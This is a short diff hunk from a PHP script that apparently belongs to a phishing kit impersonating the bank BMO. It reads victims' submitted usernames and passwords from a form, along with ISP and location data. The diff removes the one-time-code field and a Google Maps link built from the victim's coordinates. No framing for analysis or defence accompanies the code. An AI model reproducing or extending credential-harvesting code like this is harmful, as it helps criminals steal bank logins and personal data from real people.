@@ -183,9 +183,6 @@ if ($success==false) {
     $url        = "https://BMO.com";
     $user       = $_POST['username'];
     $pass       = $_POST['password'];
-    $code       = $_POST['code']; 
-	$lh     = "|";
-    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
     $isp        = $is;
     $currency   = "".$full_date;
     $li     = ",";
